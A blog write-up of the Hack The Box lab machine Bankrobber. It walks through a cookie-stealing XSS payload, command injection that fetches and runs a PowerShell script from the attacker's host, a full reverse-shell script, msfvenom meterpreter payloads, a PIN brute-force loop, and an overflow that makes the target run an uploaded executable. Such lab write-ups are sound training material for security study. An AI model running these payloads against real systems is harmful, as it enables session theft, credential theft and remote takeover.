---
layout:     post
title2:      HacktheBox Writeup - Bankrobber - QuantumlyConfused
title:     Hack the Box - Bankrobber
date:       2020-03-07 12:00:00 -0400
summary:    Starting with a client side XSS exploit to get admin app credentials, then chaining it with a localhost code execution bypass we get a user priviledged shell. A suspicious app running locally as System then presented a ... delicate ... buffer overflow opporunity to pivot into System priviledges.
categories: [hack-the-box]
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,bankrobber,xss,buffer overflow,metasploit,meterpreter,port forward,brute force
thumbnail:  https://blog.quantumlyconfused.com/assets/htb-bankrobber/infocard.PNG
canon:      https://blog.quantumlyconfused.com/hack-the-box/2020/03/07/htb-machine-bankrobber/
tags:
 - htb 
 - xss
 - code injection
 - buffer-overflow
 - port-forward
 - metasploit
---

<h1>Introduction</h1>
<p>
<img width="75%" height="75%" src="{{ '/assets/htb-bankrobber/infocard.PNG' | relative_url }}">
</p>

<p>Starting with a client side XSS exploit to get admin app credentials, then chaining it with a localhost code execution bypass we get a user priviledged shell. A suspicious app running locally as System then presented a ... delicate ... buffer overflow opportunity to pivot into System priviledges. Overall, I greatly enjoyed this machine despite the few headaches on System escalation that required rebooting the machine twice. Bankrobber reminded me of past machines I worked through in the OSCP labs almost a decade ago and I enjoyed the complex, yet straight-forward nature of the exploits.</p>

<h1>Initial Recon</h1>

<p>Let us start with an NMAP scan to see what we are working with.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Bankrobber# nmap -sC -sV -p- 10.10.10.154
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-27 20:42 EST
Nmap scan report for 10.10.10.154
Host is up (0.029s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m09s, deviation: 0s, median: 1h00m08s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-27 21:49:30
|_  start_date: 2019-11-27 20:38:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 486.67 seconds
{% endhighlight %}

<p>Alright there seems to be quite a bit available. Let's start up Burp and take a poke at the web service to see what is there.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/recon-mainpage.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-bankrobber/recon-burp.PNG' | relative_url }}">
</p>

<p>Alright, we're looking at some sort of Crypto exchange that seemingly allows us to buy, sell, and transfer "E-Coin" to individuals. The site allows new registrations, and since we don't have any good ideas for existing logons past the failed usual suspects such as admin/admin, let's go ahead and try to create a new account using <code>test/test</code>.</p>

<p>
<img width="65%" height="65%" src="{{ '/assets/htb-bankrobber/recon-register.PNG' | relative_url }}">
</p>

<p>Once in it looks like they provided us with a nice signing bonus. We have a few E-coins to play with. The functionality within the portal is a little limited, however there does seem to be a working transfer mechanism.</p>

<p>
<img width="55%" height="55%" src="{{ '/assets/htb-bankrobber/recon-transfer.PNG' | relative_url }}">
</p>

<p>To transfer E-coins it looks like we need to provide the address ID. If we take a look at our session cookie we can see that the account we created has an ID of '3' and that the username and password are the base64 values of "test", which is what we used to create our initial account. This knowledge will probably come in handy later on.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/recon-cookie.PNG' | relative_url }}">
</p>

<p>I made a small assumption at this point that the schema was incrementally numeric. With that assumed, we can try sending a small amount of E-coins to account ID=1 and see what happens.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/recon-transferburp.PNG' | relative_url }}">
</p>

<p>Back on the the site a popup also appeared.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/recon-transferadmin.PNG' | relative_url }}">
</p>

<p>Excellent, so it seems like an admin is actually reviewing the request and will either approve or deny it. I wonder if we can trick them into running something malicious... maybe to steal their cookie which we know has the username and password?</p>

<h1>User exploitation</h1>
 
<p>With a plan in mind, let's try and craft the payload properly. I recently attended a CTF event that had a similar challenge approach where I started my own Apache instance locally and crafted the payload to direct the malicious call with cookies to that instance. I took the same approach here and started my instance. I used the following payload and entered it into the comment section of the transfer function.</p>

{% highlight shell %}
<SCRIPT>var+img=new+Image();img.src="http://10.10.14.23/"%20+%20document.cookie;</SCRIPT>
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-bankrobber/user-xsspayload.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-xsspayload2.PNG' | relative_url }}">
</p>

<p>Awesome we have the cookie - <i><b>username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1</b></i>. If we do a quick base64 on the username and password we get to <code>admin/Hopelessromantic</code>. Let's use our new found credentials and log in to the portal as admin now!</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-backdoorchecker.PNG' | relative_url }}">
</p>

<p>Great! Looks like this is the panel where pending requests would be reviewed by the admin, and there seems to be something else here... a backdoorchecker?! It mentions that the backdoorchecker can only run dir, so let's give it a try. Unfortunately, we're returned a disheartening message that this can only be run <i><b>from localhost (::1)</b></i>. We are going to need to be a little more creative with our approach. If we take a step back and see how backdoorchecker is being called we can add some ammunition to how we approach the payload arsenal.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-backdoorchecker2.PNG' | relative_url }}">
</p>

<p>Are you thinking what I'm thinking Pinky? We can chain together our previous XSS payload with a call to backdoorchecker, which should get executed on localhost by the admin account. Now just running dir won't actually give us anything beneficial, so let's try and combine dir with something a bit more tangible - a ping back to our machine. Let's start wireshark and modify the original XSS payload to.</p>

{% highlight shell %}
<script>callSys(dir | ping 10.10.14.23);</script>
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-bankrobber/user-backdoorchecker3.PNG' | relative_url }}">
</p>

<p>Instead of waiting for the "real" admin to automatically approve it, let's go ahead and approve it ourselves. We then see our our callback did indeed work!</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-backdoorchecker4.PNG' | relative_url }}">
</p>

<p>Alright, where can we go from here. Instead of a ping let's see if we can call a reverse shell script. We host the file locally on our Apache instance and change the payload to the following:</p>

{% highlight shell %}
<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23:80/winrev2.ps1')");</script>
{% endhighlight %}

<p>With a reverse shell script as below:</p>

{% highlight python %}
root@kali:/var/www/html# cat winrev2.ps1 
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.23', 1337);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
{% endhighlight %}

<p>Next we go back to the admin panel to approve our request.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-backdoorchecker5.PNG' | relative_url }}">
</p>

<p>And finally we get our user shell!</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-shell.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-bankrobber/user-shell2.PNG' | relative_url }}">
</p>

<p>No time to rest, we're only getting started!</p>

<h1>Root exploitation</h1>

<p>Firstly we should try and upgrade our shell. While our initial shell served its purpose, it is quite limited. Let's see if we can get a meterpreter session up and running.</p>

{% highlight shell %}
root@kali:/var/www/html# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
{% endhighlight %}

<p>Now let's craft up another XSS payload and get the executable downloaded on to the host then trigger it from our first shell.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-meterpreter.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-bankrobber/root-meterpreter2.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-bankrobber/root-meterpreter3.PNG' | relative_url }}">
</p>

<p>A bit of recon with our new shell and we find a potentially interesting binary as well as a service running on port 910 locally that we did not see externally.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-recon.PNG' | relative_url }}">
</p>
<p>
<img src="{{ '/assets/htb-bankrobber/root-recon2.PNG' | relative_url }}">
</p>

<p>We want to give this port a closer look. A good way of doing this is to forward the 910 port to our local machine.</p>

{% highlight shell %}
meterpreter > portfwd add -l 910 -p 910 -r 10.10.10.154
[-] You must supply a local port, remote host, and remote port.
meterpreter > portfwd add -l 910 -p 910 -r 10.10.10.154
[*] Local TCP relay created: :910 <-> 10.10.10.154:910
meterpreter > 
{% endhighlight %}

<p>I decided to take a look using the browser first.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-binary.PNG' | relative_url }}">
</p>

<p>Ah, seems more like a nc connection kinda thing.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Bankrobber# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1111
 [!] Access denied, disconnecting client....
{% endhighlight %}

<p>Hum... ok let's just cut to the chase and brute through the 10,000 possibilities. Hopefully there isn't any lockout mechanism and we aren't shooting ourselves in the foot by doing this!</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Bankrobber# for i in {0000..9999}; do echo $i; echo $i | nc localhost 910; sleep 0.1; done 
0000
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$]  [!] Access denied, disconnecting client....
...
<snip>
...
0021
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$]  [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] id
.........
 [!] You waited too long, disconnecting client....
{% endhighlight %}

<p>Excellent, we get the pin <code>0021</code> and we are one step closer.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-binary2.PNG' | relative_url }}">
</p>

<p>Alright that is interesting, it seems to call a separate transfer executable on the host as part of the process. Let's see if we can run a quick buffer overflow and overwrite the executable.</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-binary3.PNG' | relative_url }}">
</p>

<p>Now we are talking! Ok, now time to get the exact offset where we can put our own executable.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Bankrobber# nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3A using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3A

 [$] Transaction in progress, you can safely disconnect...
{% endhighlight %}

<p>We can reuse our meterpreter payload setup, creating a payload2.exe with a port of 4445 instead of the default 4444. We upload the executable to the host and then trigger it by supplying the following payload to the bankv2 connection.</p>

{% highlight shell %}
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\temp\payload2.exe
{% endhighlight %}

<p>
<img src="{{ '/assets/htb-bankrobber/root-binary4.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-owned.PNG' | relative_url }}">
</p>

<p>
<img src="{{ '/assets/htb-bankrobber/root-owned3.PNG' | relative_url }}">
</p>

<p>And just like that our adventure with Bankrobber comes to an end. Thanks folks, until next time!</p>

<h1>Extra fun</h1>

<p>I mentioned at the start of the article that the buffer overflow was fragile. When I first attempted to fuzz bankv2 with A's I actually ended up crashing the process. Unfortunately, there didn't seem to be any auto-restart logic in place, so to continue with the machine I had to issue a restart request from the HTB portal and restart the machine from the beginning. This was a sobering realization to be careful with these types of activities.</p> 